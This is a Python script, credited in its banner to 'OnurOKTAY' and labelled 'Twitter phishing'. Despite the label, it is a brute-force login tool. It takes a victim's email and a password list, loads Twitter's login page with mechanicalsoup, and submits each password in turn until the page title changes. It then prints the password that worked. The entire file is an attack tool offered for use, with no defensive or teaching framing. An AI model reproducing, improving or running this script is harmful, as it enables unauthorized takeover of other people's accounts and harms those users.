import mechanicalsoup
from optparse import OptionParser
from colorama import Fore

parse = OptionParser(Fore.CYAN+"""


#=======================================================================================#
#                                                                                       #
#                                                                                       #
#                                                                                       #
#  *   )            )   )                    )         )                                #
#` )  /((  (  (  ( /(( /(  (  (           ( /((     ( /((        (  (                   #
# ( )(_))\))( )\ )\())\())))\ )(    `  )  )\())\ (  )\())\  (    )\))(                  #
#(_(_()|(_)()((_|_))(_))//((_|()\   /(/( ((_)((_))\((_)((_) )\ )((_))\                  #
#|_   _|(()((_|_) |_| |_(_))  ((_) ((_)_\| |(_|_|(_) |(_|_)_(_/( (()(_)                 #
#  | | \ V  V / |  _|  _/ -_)| '_| | '_ \) ' \| (_-< ' \| | ' \)) _` |                  #
#  |_|  \_/\_/|_|\__|\__\___||_|   | .__/|_||_|_/__/_||_|_|_||_|\__, |                  #
#                                  |_|                          |___/                   #
#                                                                                       #
#                                                                                       #
#                                                                                       #
#                                                                                       #
#                                                     by OnurOKTAY                      #
#                                                                                       #
#=======================================================================================#

#========================================================================================#


"""+Fore.RESET)
print(Fore.RED+"#=======================================================================================#" +Fore.RESET)

parse.add_option('-e','--email',dest='email',type='string',help='the account email')
parse.add_option('-l','--list',dest='password_list',type='string',help='password list')
(options,args) = parse.parse_args()
if options.email == None or  options.password_list == None:
    print(parse.usage)
    exit(0)
else:
    try:
        print(Fore.RED+"<<<<<<//start attacking email for you :) //>>>>>"+Fore.RESET)
        browser = mechanicalsoup.Browser(soup_config={"features":"html.parser"})
        login_page = browser.get("https://twitter.com/login?lang=en")
        password_list = options.password_list
        email = options.email
        open_password_list = open(password_list,'r')
        for i in open_password_list.readlines():
            i = i.rstrip("\n")
            login_form = login_page.soup.select("form")[1]
            login_form.select("input")[0]['value'] = email #username
            login_form.select("input")[1] ['value'] = i #password
            secound_page = browser.submit(login_form,login_page.url)
            print("[*]trying {0}".format(i))
            if secound_page.soup.select("title")[0].text != "Login on Twitter":
                print ("[+] login password is {0}".format(i))
                exit(0)
    except Exception as e:
        print(e)
    except KeyboardInterrupt:
        print("OK ! as you like")

